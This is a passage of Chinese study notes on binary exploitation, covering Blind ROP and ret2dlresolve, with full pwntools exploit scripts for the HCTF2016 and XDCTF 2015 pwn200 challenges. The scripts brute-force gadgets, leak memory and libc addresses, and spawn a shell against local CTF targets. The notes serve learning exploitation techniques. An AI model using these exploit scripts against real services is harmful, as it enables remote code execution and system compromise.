address\n```\n\n要向得到canary以及之后的变量，我们需要解决第一个问题，如何得到overflow的长度，这个可以通过不断尝试来获取。\n\n其次，关于canary以及后面的变量，所采用的的方法一致，这里我们以canary为例。\n\ncanary本身可以通过爆破来获取，但是如果只是愚蠢地枚举所有的数值的话，显然是低效的。\n\n需要注意的是，攻击条件2表明了程序本身并不会因为crash有变化，所以每次的canary等值都是一样的。所以我们可以按照字节进行爆破。正如论文中所展示的，每个字节最多有256种可能，所以在32位的情况下，我们最多需要爆破1024次，64位最多爆破2048次。\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210629162057713.png\" alt=\"image-20210629162057713\" style=\"zoom:67%;\" />\n\n**Blind ROP**\n\n最朴素的执行write函数的方法就是构造系统调用。\n\npop rdi; ret # socket\n pop rsi; ret # buffer\n pop rdx; ret # length\n pop rax; ret # write syscall number\n syscall\n\n但通常来说，这样的方法都是比较困难的，因为想要找到一个syscall的地址基本不可能。。。我们可以通过转换为找write的方式来获取。\n\n**BROP gadgets**\n\n首先，在libc_csu_init的结尾一长串的gadgets，我们可以通过偏移来获取write函数调用的前两个参数。正如文中所展示的\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210629162209719.png\" alt=\"image-20210629162209719\" style=\"zoom:67%;\" />\n\n**find a call write**\n\n我们可以通过plt表来获取write的地址。\n\n**control rdx**\n\n需要注意的是，rdx只是我们用来输出程序字节长度的变量，只要不为0即可。一般来说程序中的rdx经常性会不是零。但是为了更好地控制程序输出，我们仍然尽量可以控制这个值。但是，在程序\n\npop rdx; ret\n\n这样的指令几乎没有。那么，我们该如何控制rdx的数值呢？这里需要说明执行strcmp的时候，rdx会被设置为将要被比较的字符串的长度，所以我们可以找到strcmp函数，从而来控制rdx。\n\n那么接下来的问题，我们就可以分为两项\n\n- 寻找gadgets\n\n- 寻找PLT表\n\n- - write入口\n  - strcmp入口\n\n**寻找gadgets**\n\n首先，我们来想办法寻找gadgets。此时，由于尚未知道程序具体长什么样，所以我们只能通过简单的控制程序的返回地址为自己设置的值，从而而来猜测相应的gadgets。而当我们控制程序的返回地址时，一般有以下几种情况\n\n- 程序直接崩溃\n- 程序运行一段时间后崩溃\n- 程序一直运行而并不崩溃\n\n为了寻找合理的gadgets，我们可以分为以下两步\n\n**寻找stop gadgets**\n\n所谓stop gadget一般指的是这样一段代码：当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。\n\n其实stop gadget也并不一定得是上面的样子，其根本的目的在于告诉攻击者，所测试的返回地址是一个gadgets。\n\n之所以要寻找stop gadgets，是因为当我们猜到某个gadgtes后，如果我们仅仅是将其布置在栈上，由于执行完这个gadget之后，程序还会跳到栈上的下一个地址。如果该地址是非法地址，那么程序就会crash。这样的话，在攻击者看来程序只是单纯的crash了。因此，攻击者就会认为在这个过程中并没有执行到任何的useful gadget，从而放弃它。例子如下图\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210629162456711.png\" alt=\"image-20210629162456711\" style=\"zoom:67%;\" />\n\n但是，如果我们布置了stop gadget，那么对于我们所要尝试的每一个地址，如果它是一个gadget的话，那么程序不会崩溃。接下来，就是去想办法识别这些gadget。\n\n**识别 gadgets**\n\n那么，我们该如何识别这些gadgets呢？我们可以通过栈布局以及程序的行为来进行识别。为了更加容易地进行介绍，这里定义栈上的三种地址\n\n- **Probe**\n\n- - 探针，也就是我们想要探测的代码地址。一般来说，都是64位程序，可以直接从0x400000尝试，如果不成功，有可能程序开启了PIE保护，再不济，就可能是程序是32位了。。这里我还没有特别想明白，怎么可以快速确定远程的位数。\n\n- **Stop**\n\n- - 不会使得程序崩溃的stop      gadget的地址。\n\n- **Trap**\n\n- - 可以导致程序崩溃的地址\n\n我们可以通过在栈上摆放不同顺序的**Stop**与 **Trap**从而来识别出正在执行的指令。因为执行Stop意味着程序不会崩溃，执行Trap意味着程序会立即崩溃。这里给出几个例子\n\n- probe,stop,traps(traps,traps,...)\n\n- - 我们通过程序崩溃与否(**如果程序在probe处直接崩溃怎么判断**)可以找到不会对栈进行pop操作的gadget，如\n\n  - - ret\n    - xor eax,eax; ret\n\n- probe,trap,stop,traps\n\n- - 我们可以通过这样的布局找到只是弹出一个栈变量的gadget。如\n\n  - - pop rax; ret\n    - pop rdi; ret\n\n- probe, trap, trap,     trap, trap, trap, trap, stop, traps\n\n- - 我们可以通过这样的布局来找到弹出6个栈变量的gadget，也就是与brop      gadget相似的gadget。**这里感觉原文是有问题的，比如说如果遇到了只是pop一个栈变量的地址，其实也是不会崩溃的，，**这里一般来说会遇到两处比较有意思的地方\n\n  - - plt处不会崩，，\n    - _start处不会崩，相当于程序重新执行。\n\n之所以要在每个布局的后面都放上trap，是为了能够识别出，当我们的probe处对应的地址执行的指令跳过了stop，程序立马崩溃的行为。\n\n但是，即使是这样，我们仍然难以识别出正在执行的gadget到底是在对哪个寄存器进行操作。\n\n但是，需要注意的是向BROP这样的一下子弹出6个寄存器的gadgets，程序中并不经常出现。所以，如果我们发现了这样的gadgets，那么，有很大的可能性，这个gadgets就是brop gadgets。此外，这个gadgets通过错位还可以生成pop rsp等这样的gadgets，可以使得程序崩溃也可以作为识别这个gadgets的标志。\n\n此外，根据我们之前学的ret2libc_csu_init可以知道该地址减去0x1a就会得到其上一个gadgets。可以供我们调用其它函数。\n\n需要注意的是probe可能是一个stop gadget，我们得去检查一下，怎么检查呢？我们只需要让后面所有的内容变为trap地址即可。因为如果是stop gadget的话，程序会正常执行，否则就会崩溃。看起来似乎很有意思.\n\n**寻找PLT**\n\n如下图所示，程序的plt表具有比较规整的结构，每一个plt表项都是16字节。而且，在每一个表项的6字节偏移处，是该表项对应的函数的解析路径，即程序最初执行该函数的时候，会执行该路径对函数的got地址进行解析。\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210629162829637.png\" alt=\"image-20210629162829637\" style=\"zoom:67%;\" />\n\n此外，对于大多数plt调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了一系列的长度为16的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了plt表。除此之外，我们还可以通过前后偏移6字节，来判断我们是处于plt表项中间还是说处于开头。\n\n**控制rdx**\n\n当我们找到plt表之后，下面，我们就该想办法来控制rdx的数值了，那么该如何确认strcmp的位置呢？需要提前说的是，并不是所有的程序都会调用strcmp函数，所以在没有调用strcmp函数的情况下，我们就得利用其它方式来控制rdx的值了。这里给出程序中使用strcmp函数的情况。\n\n之前，我们已经找到了brop的gadgets，所以我们可以控制函数的前两个参数了。与此同时，我们定义以下两种地址\n\n- readable，可读的地址。\n- bad,     非法地址，不可访问，比如说0x0。\n\n那么我们如果控制传递的参数为这两种地址的组合，会出现以下四种情况\n\n- strcmp(bad,bad)\n- strcmp(bad,readable)\n- strcmp(readable,bad)\n- strcmp(readable,readable)\n\n只有最后一种格式，程序才会正常执行。\n\n**注**：在没有PIE保护的时候，64位程序的ELF文件的0x400000处有7个非零字节。\n\n那么我们该如何具体地去做呢？有一种比较直接的方法就是从头到尾依次扫描每个plt表项，但是这个却比较麻烦。我们可以选择如下的一种方法\n\n- 利用plt表项的慢路径\n- 并且利用下一个表项的慢路径的地址来覆盖返回地址\n\n这样，我们就不用来回控制相应的变量了。\n\n当然，我们也可能碰巧找到strncmp或者strcasecmp函数，它们具有和strcmp一样的效果。\n\n**寻找输出函数**\n\n寻找输出函数既可以寻找write，也可以寻找puts。一般现先找puts函数。不过这里为了介绍方便，先介绍如何寻找write。\n\n**寻找write@plt**\n\n当我们可以控制write函数的三个参数的时候，我们就可以再次遍历所有的plt表，根据write函数将会输出内容来找到对应的函数。需要注意的是，这里有个比较麻烦的地方在于我们需要找到文件描述符的值。一般情况下，我们有两种方法来找到这个值\n\n- 使用rop     chain，同时使得每个rop对应的文件描述符不一样\n- 同时打开多个连接，并且我们使用相对较高的数值来试一试。\n\n需要注意的是\n\n- linux默认情况下，一个进程最多只能打开1024个文件描述符。\n- posix标准每次申请的文件描述符数值总是当前最小可用数值。\n\n当然，我们也可以选择寻找puts函数。\n\n**寻找puts@plt**\n\n寻找puts函数(这里我们寻找的是 plt)，我们自然需要控制rdi参数，在上面，我们已经找到了brop gadget。那么，我们根据brop gadget偏移9可以得到相应的gadgets（由ret2libc_csu_init中后续可得）。同时在程序还没有开启PIE保护的情况下，0x400000处为ELF文件的头部，其内容为\\x7fELF。所以我们可以根据这个来进行判断。一般来说，其payload如下\n\npayload = 'A'*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)\n\n此时，攻击者已经可以控制输出函数了，那么攻击者就可以输出.text段更多的内容以便于来找到更多合适gadgets。同时，攻击者还可以找到一些其它函数，如dup2或者execve函数。一般来说，攻击者此时会去做下事情\n\n- 将socket输出重定向到输入输出\n- 寻找“/bin/sh”的地址。一般来说，最好是找到一块可写的内存，利用write函数将这个字符串写到相应的地址。\n- 执行execve获取shell，获取execve不一定在plt表中，此时攻击者就需要想办法执行系统调用了。\n\n以HCTF2016的出题人失踪了为例\n\n1.确定栈溢出长度。\n\n```python\ndef getbufferflow_length():\n    i = 1\n    while 1:\n        try:\n            sh = remote('127.0.0.1', 9999)\n            sh.recvuntil('WelCome my friend,Do you know password?\\n')\n            sh.send(i * 'a')\n            output = sh.recv()\n            sh.close()\n            if not output.startswith('No password'):\n                return i - 1\n            else:\n                i += 1\n        except EOFError:\n            sh.close()\n            return i - 1\n```\n\n根据上面，我们可以确定，栈溢出的长度为72。同时，根据回显信息可以发现程序并没有开启canary保护，否则，就会有相应的报错内容。所以我们不需要执行stack reading。\n\n2.寻找 stop gadgets。\n\n寻找过程如下：\n\n```python\ndef get_stop_addr(length):\n    addr = 0x400000\n    while 1:\n        try:\n            sh = remote('127.0.0.1', 9999)\n            sh.recvuntil('password?\\n')\n            payload = 'a' * length + p64(addr)\n            sh.sendline(payload)\n            sh.recv()\n            sh.close()\n            print 'one success addr: 0x%x' % (addr)\n            return addr\n        except Exception:\n            addr += 1\n            sh.close()\n```\n\n这里我们直接尝试64位程序没有开启PIE的情况，因为一般是这个样子的，如果开启了，那就按照开启了的方法做，结果发现了不少，我选择了一个貌似返回到源程序中的地址\n\none success stop gadget addr: 0x4006b6\n\n3.识别brop gadgets。\n\n下面，我们根据上面介绍的原理来得到对应的brop gadgets地址。构造如下，get_brop_gadget是为了得到可能的brop gadget，后面的check_brop_gadget是为了检查。\n\n```python\ndef get_brop_gadget(length, stop_gadget, addr):\n    try:\n        sh = remote('127.0.0.1', 9999)\n        sh.recvuntil('password?\\n')\n        payload = 'a' * length + p64(addr) + p64(0) * 6 + p64(\n            stop_gadget) + p64(0) * 10\n        sh.sendline(payload)\n        content = sh.recv()\n        sh.close()\n        print content\n        # stop gadget returns memory\n        if not content.startswith('WelCome'):\n            return False\n        return True\n    except Exception:\n        sh.close()\n        return False\ndef check_brop_gadget(length, addr):\n    try:\n        sh = remote('127.0.0.1', 9999)\n        sh.recvuntil('password?\\n')\n        payload = 'a' * length + p64(addr) + 'a' * 8 * 10\n        sh.sendline(payload)\n        content = sh.recv()\n        sh.close()\n        return False\n    except Exception:\n        sh.close()\n        return True\n##length = getbufferflow_length()\nlength = 72\n##get_stop_addr(length)\nstop_gadget = 0x4006b6\naddr = 0x400740\nwhile 1:\n    print hex(addr)\n    if get_brop_gadget(length, stop_gadget, addr):\n        print 'possible brop gadget: 0x%x' % addr\n        if check_brop_gadget(length, addr):\n            print 'success brop gadget: 0x%x' % addr\n            break\n    addr += 1\n```\n\n这样，我们基本得到了brop的gadgets地址0x4007ba\n\n4.确定puts@plt地址。\n\n根据上面所说，我们可以构造如下payload来进行获取：\n\n```python\npayload = 'A'*72 +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)\n```\n\n具体函数如下：\n\n```python\ndef get_puts_addr(length, rdi_ret, stop_gadget):\n    addr = 0x400000\n    while 1:\n        print hex(addr)\n        sh = remote('127.0.0.1', 9999)\n        sh.recvuntil('password?\\n')\n        payload = 'A' * length + p64(rdi_ret) + p64(0x400000) + p64(\n            addr) + p64(stop_gadget)\n        sh.sendline(payload)\n        try:\n            content = sh.recv()\n            if content.startswith('\\x7fELF'):\n                print 'find puts@plt addr: 0x%x' % addr\n                return addr\n            sh.close()\n            addr += 1\n        except Exception:\n            sh.close()\n            addr += 1\n```\n\n最后根据plt的结构，选择0x400560作为puts@plt\n\n5.泄露puts@got地址。\n\n在我们可以调用puts函数后，我们可以泄露puts函数的地址，进而获取libc版本，从而获取相关的system函数地址与/bin/sh地址，从而获取shell。我们从0x400000开始泄露0x1000个字节，这已经足够包含程序的plt部分了。代码如下：\n\n```python\ndef leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget):\n    sh = remote('127.0.0.1', 9999)\n    payload = 'a' * length + p64(rdi_ret) + p64(leak_addr) + p64(\n        puts_plt) + p64(stop_gadget)\n    sh.recvuntil('password?\\n')\n    sh.sendline(payload)\n    try:\n        data = sh.recv()\n        sh.close()\n        try:\n            data = data[:data.index(\"\\nWelCome\")]\n        except Exception:\n            data = data\n        if data == \"\":\n            data = '\\x00'\n        return data\n    except Exception:\n        sh.close()\n        return None\n##length = getbufferflow_length()\nlength = 72\n##stop_gadget = get_stop_addr(length)\nstop_gadget = 0x4006b6\n##brop_gadget = find_brop_gadget(length,stop_gadget)\nbrop_gadget = 0x4007ba\nrdi_ret = brop_gadget + 9\n##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)\nputs_plt = 0x400560\naddr = 0x400000\nresult = \"\"\nwhile addr < 0x401000:\n    print hex(addr)\n    data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)\n    if data is None:\n        continue\n    else:\n        result += data\n    addr += len(data)\nwith open('code', 'wb') as f:\n    f.write(result)\n\n```\n\n6.最后，我们将泄露的内容写到文件里。需要注意的是如果泄露出来的是“”,那说明我们遇到了'\\x00'，因为puts是输出字符串，字符串是以'\\x00'为终止符的。之后利用ida打开binary模式，首先在edit->segments->rebase program 将程序的基地址改为0x400000，然后找到偏移0x560处，如下:\n\n```assembly\nseg000:0000000000400560                 db 0FFh\nseg000:0000000000400561                 db  25h ; %\nseg000:0000000000400562                 db 0B2h ;\nseg000:0000000000400563                 db  0Ah\nseg000:0000000000400564                 db  20h\nseg000:0000000000400565                 db    0\n#然后按下c,将此处的数据转换为汇编指令，如下\nseg000:0000000000400560 ; ---------------------------------------------------------------------------\nseg000:0000000000400560                 jmp     qword ptr cs:601018h\nseg000:0000000000400566 ; ---------------------------------------------------------------------------\nseg000:0000000000400566                 push    0\nseg000:000000000040056B                 jmp     loc_400550\nseg000:000000000040056B ; ---------------------------------------------------------------------------\n\n```\n\n这说明，puts@got的地址为0x601018。\n\n7.程序利用\n\n```python\n##length = getbufferflow_length()\nlength = 72\n##stop_gadget = get_stop_addr(length)\nstop_gadget = 0x4006b6\n##brop_gadget = find_brop_gadget(length,stop_gadget)\nbrop_gadget = 0x4007ba\nrdi_ret = brop_gadget + 9\n##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)\nputs_plt = 0x400560\n##leakfunction(length, rdi_ret, puts_plt, stop_gadget)\nputs_got = 0x601018\nsh = remote('127.0.0.1', 9999)\nsh.recvuntil('password?\\n')\npayload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)\nsh.sendline(payload)\ndata = sh.recvuntil('\\nWelCome', drop=True)\nputs_addr = u64(data.ljust(8, '\\x00'))\nlibc = LibcSearcher('puts', puts_addr)\nlibc_base = puts_addr - libc.dump('puts')\nsystem_addr = libc_base + libc.dump('system')\nbinsh_addr = libc_base + libc.dump('str_bin_sh')\npayload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(stop_gadget)\nsh.sendline(payload)\nsh.interactive()\n```\n\n### 高级了！！！不敢想象wow~ ⊙o⊙！！！\n\n**ret2_dl_runtime_resolve**\n\n高级ROP其实和一般的ROP基本一样，其主要的区别在于它利用了一些更加底层的原理。\n\n要想弄懂这个ROP利用技巧，需要首先理解ELF文件的基本结构，以及动态链接的基本过程，请参考executable中elf对应的介绍。这里我只给出相应的利用方式。\n\n我们知道在linux中是利用_dl_runtime_resolve(link_map_obj, reloc_index)来对动态链接的函数进行重定位的。那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案还肯定的。具体利用方式如下\n\n1. 控制程序执行dl_resolve函数\n\n2. - 给定Link_map以及index两个参数。\n   - 当然我们可以直接给定 plt0对应的汇编代码，这时，我们就只需要一个index就足够了。\n\n3. 控制index的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。\n\n4. 伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。\n\n5. 伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。\n\n**此外，这个攻击成功的很必要的条件**\n\n- **dl_resolve函数不会检查对应的符号是否越界，它只会根据我们所给定的数据来执行。**\n- **dl_resolve函数最后的解析根本上依赖于所给定的字符串。**\n\n**注意**：\n\n- 符号版本信息\n\n- - 最好使得ndx = VERSYM[(reloc->r_info) >> 8] 的值为0，以便于防止找不到的情况。\n\n- 重定位表项\n\n- - r_offset必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。\n\n**攻击条件**\n\n说了这么多，这个利用技巧其实还是ROP，同样可以绕过NX和ASLR保护。但是，这个攻击更适于一些比较简单的栈溢出的情况，但同时又难以泄露获取更多信息的情况下。\n\n**以XDCTF 2015的pwn200为例**\n\n首先我们可以编译下ret2dlresolve文件夹下的源文件main.c文件得到二进制文件，这里取消了Canary保护。\n\n```assembly\n➜  ret2dlresolve git:(master) ✗ gcc main.c -m32 -fno-stack-protector -o main\n```\n\n在下面的讲解过程中，我会按照以两种不同的方法来进行讲解。其中第一种方法比较麻烦，但是可以仔细理解ret2dlresolve的原理，第二种方法则是直接使用已有的工具，相对容易一点。\n\n\t1. 利用正常的代码来使用该技巧从而获取shell。\n     \\-  stage 1 测试控制程序执行write函数的效果。\n     \\-  stage 2 测试控制程序执行dl_resolve函数，并且相应参数指向正常write函数的plt时的执行效果。\n     \\-  stage 3 测试控制程序执行dl_resolve函数，并且相应参数指向伪造的write函数的plt时的执行效果。\n\n2. 利用roputils中已经集成好的工具来实现攻击，从而获取shell。\n\n**正常攻击**\n\n显然我们程序有一个很明显的栈溢出漏洞的。这题我们不考虑我们有libc的情况。我们可以很容易的分析出偏移为112。\n\n```assembly\ngef➤  pattern create 200\n[+] Generating a pattern of 200 bytes\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n[+] Saved as '$_gef0'\ngef➤  r\nStarting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main\nWelcome to XDCTF2015~!\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\nProgram received signal SIGSEGV, Segmentation fault.\n0x62616164 in ?? ()\n─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]──────────────────────────────────────────────────────────\n$eax   : 0x000000c9\n$ebx   : 0x00000000\n$ecx   : 0xffffcc6c  →  \"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]\"\n$edx   : 0x00000100\n$esp   : 0xffffcce0  →  \"eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]\"\n$ebp   : 0x62616163 (\"caab\"?)\n$esi   : 0xf7fac000  →  0x001b1db0\n$edi   : 0xffffcd50  →  0xffffcd70  →  0x00000001\n$eip   : 0x62616164 (\"daab\"?)\n$cs    : 0x00000023\n$ss    : 0x0000002b\n$ds    : 0x0000002b\n$es    : 0x0000002b\n$fs    : 0x00000000\n$gs    : 0x00000063\n$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]\n───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────────────────\n[!] Cannot disassemble from $PC\n───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────────────────\n['0xffffcce0', 'l8']\n8\n0xffffcce0│+0x00: \"eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]\"  ← $esp\n0xffffcce4│+0x04: \"faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]\"\n0xffffcce8│+0x08: \"gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa[...]\"\n0xffffccec│+0x0c: \"haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]\"\n0xffffccf0│+0x10: \"iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua[...]\"\n0xffffccf4│+0x14: \"jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]\"\n0xffffccf8│+0x18: \"kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa[...]\"\n0xffffccfc│+0x1c: \"laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]\"\n───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────\n────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────\ngef➤  pattern search\n[!] Syntax\npattern search PATTERN [SIZE]\ngef➤  pattern search 0x62616164\n[+] Searching '0x62616164'\n[+] Found at offset 112 (little-endian search) likely\n\n```\n\n**stage 1**\n\n这里我们的主要目的是控制程序执行write函数，虽然我们可以控制程序直接执行write函数。但是这里我们采用一个更加复杂的办法，即使用栈迁移的技巧，将栈迁移到bss段来控制write函数。即主要分为两步\n\n1. 将栈迁移到bss段。\n2. 控制write函数输出相应字符串。\n\n这里主要使用了pwntools中的ROP模块。具体代码如下\n\n```python\nfrom pwn import *\nelf = ELF('main')\nr = process('./main')\nrop = ROP('./main')\noffset = 112\nbss_addr = elf.bss()\nr.recvuntil('Welcome to XDCTF2015~!\\n')\n## stack privot to bss segment\n## new stack size is 0x800\nstack_size = 0x800\nbase_stage = bss_addr + stack_size\n### padding\nrop.raw('a' * offset)\n### read 100 byte to base_stage\nrop.read(0, base_stage, 100)\n### stack privot, set esp = base_stage\nrop.migrate(base_stage)\nr.sendline(rop.chain())\n## write cmd=\"/bin/sh\"\nrop = ROP('./main')\nsh = \"/bin/sh\"\nrop.write(1, base_stage + 80, len(sh))\nrop.raw('a' * (80 - len(rop.chain())))\nrop.raw(sh)\nrop.raw('a' * (100 - len(rop.chain())))\nr.sendline(rop.chain())\nr.interactive()\n```\n\n结果如下\n\n```assembly\n➜  ret2dlresolve git:(master) ✗ python stage1.py\n[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n[+] Starting local process './main': pid 120912\n[*] Loaded cached gadgets for './main'\n[*] Switching to interactive mode\n/bin/sh[*] Got EOF while reading in interactive\n```\n\n**stage 2**\n\n在这一阶段，我们将会利用dlresolve相关的知识来控制程序执行write函数。这里我们主要是利用plt[0]中的相关指令，即push linkmap以及跳转到dl_resolve函数中解析的指令。此外，我们还得单独提供一个write重定位项在plt表中的偏移。\n\n```python\nfrom pwn import *\nelf = ELF('main')\nr = process('./main')\nrop = ROP('./main')\noffset = 112\nbss_addr = elf.bss()\nr.recvuntil('Welcome to XDCTF2015~!\\n')\n## stack privot to bss segment\n## new stack size is 0x800\nstack_size = 0x800\nbase_stage = bss_addr + stack_size\n### padding\nrop.raw('a' * offset)\n### read 100 byte to base_stage\nrop.read(0, base_stage, 100)\n### stack privot, set esp = base_stage\nrop.migrate(base_stage)\nr.sendline(rop.chain())\n## write cmd=\"/bin/sh\"\nrop = ROP('./main')\nsh = \"/bin/sh\"\nplt0 = elf.get_section_by_name('.plt').header.sh_addr\nwrite_index = (elf.plt['write'] - plt0) / 16 - 1\nwrite_index *= 8\nrop.raw(plt0)\nrop.raw(write_index)\n## fake ret addr of write\nrop.raw('bbbb')\nrop.raw(1)\nrop.raw(base_stage + 80)\nrop.raw(len(sh))\nrop.raw('a' * (80 - len(rop.chain())))\nrop.raw(sh)\nrop.raw('a' * (100 - len(rop.chain())))\nr.sendline(rop.chain())\nr.interactive()\n```\n\n效果如下，仍然输出了cmd对应的字符串。\n\n```assembly\n➜  ret2dlresolve git:(master) ✗ python stage2.py\n[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n[+] Starting local process './main': pid 123406\n[*] Loaded cached gadgets for './main'\n[*] Switching to interactive mode\n/bin/sh[*] Got EOF while reading in interactive\n```\n\n**stage 3**\n\n这一次，我们同样控制dl_resolve函数中的index_offset参数，不过这次控制其指向我们伪造的write重定位项。\n\n鉴于pwntools本身并不支持对重定位表项的信息的获取。这里我们手动看一下\n\n```assembly\n➜  ret2dlresolve git:(master) ✗ readelf -r main  \n重定位节 '.rel.dyn' 位于偏移量 0x318 含有 3 个条目：\n 偏移量     信息    类型              符号值      符号名称\n08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__\n0804a040  00000905 R_386_COPY        0804a040   stdin@GLIBC_2.0\n0804a044  00000705 R_386_COPY        0804a044   stdout@GLIBC_2.0\n重定位节 '.rel.plt' 位于偏移量 0x330 含有 5 个条目：\n 偏移量     信息    类型              符号值      符号名称\n0804a00c  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0\n0804a010  00000207 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0\n0804a014  00000407 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0\n0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0\n0804a01c  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0\n```\n\n可以看出write的重定表项的r_offset=0x0804a01c，r_info=0x00000607。具体代码如下\n\n```python\nfrom pwn import *\nelf = ELF('main')\nr = process('./main')\nrop = ROP('./main')\noffset = 112\nbss_addr = elf.bss()\nr.recvuntil('Welcome to XDCTF2015~!\\n')\n## stack privot to bss segment\n## new stack size is 0x800\nstack_size = 0x800\nbase_stage = bss_addr + stack_size\n### padding\nrop.raw('a' * offset)\n### read 100 byte to base_stage\nrop.read(0, base_stage, 100)\n### stack privot, set esp = base_stage\nrop.migrate(base_stage)\nr.sendline(rop.chain())\n## write sh=\"/bin/sh\"\nrop = ROP('./main')\nsh = \"/bin/sh\"\nplt0 = elf.get_section_by_name('.plt').header.sh_addr\nrel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr\n## making base_stage+24 ---> fake reloc\nindex_offset = base_stage + 24 - rel_plt\nwrite_got = elf.got['write']\nr_info = 0x607\nrop.raw(plt0)\nrop.raw(index_offset)\n## fake ret addr of write\nrop.raw('bbbb')\nrop.raw(1)\nrop.raw(base_stage + 80)\nrop.raw(len(sh))\nrop.raw(write_got)  # fake reloc\nrop.raw(r_info)\nrop.raw('a' * (80 - len(rop.chain())))\nrop.raw(sh)\nrop.raw('a' * (100 - len(rop.chain())))\nr.sendline(rop.chain())\nr.interactive()\n```\n\n最后结果如下，这次我们在bss段伪造了一个假的write的重定位项，仍然输出了对应的字符串。\n\n```assembly\n➜  ret2dlresolve git:(master) ✗ python stage3.py\n[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n[+] Starting local process './main': pid 126063\n[*] Loaded cached gadgets for './main'\n[*] Switching to interactive mode\n/bin/sh[*] Got EOF while reading in interactive\n```\n\n**stage 4**\n\nstage3中，我们控制了重定位表项，但是重定位表项的内容与write原来的重定位表项一致，这次，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。首先，我们根据write的重定位表项的r_info=0x607可以知道，write对应的符号在符号表的下标为0x607>>8=0x6。因此，我们知道write对应的符号地址为0x8048238。\n\n```assembly\n➜  ret2dlresolve git:(master) ✗ objdump -s -EL -j  .dynsym main\nmain：     文件格式 elf32-i386\nContents of section .dynsym:\n 80481d8 00000000 00000000 00000000 00000000  ................\n 80481e8 33000000 00000000 00000000 12000000  3...............\n 80481f8 27000000 00000000 00000000 12000000  '...............\n 8048208 52000000 00000000 00000000 20000000  R........... ...\n 8048218 20000000 00000000 00000000 12000000   ...............\n 8048228 3a000000 00000000 00000000 12000000  :...............\n 8048238 4c000000 00000000 00000000 12000000  L...............\n 8048248 2c000000 44a00408 04000000 11001a00  ,...D...........\n 8048258 0b000000 3c860408 04000000 11001000  ....<...........\n 8048268 1a000000 40a00408 04000000 11001a00  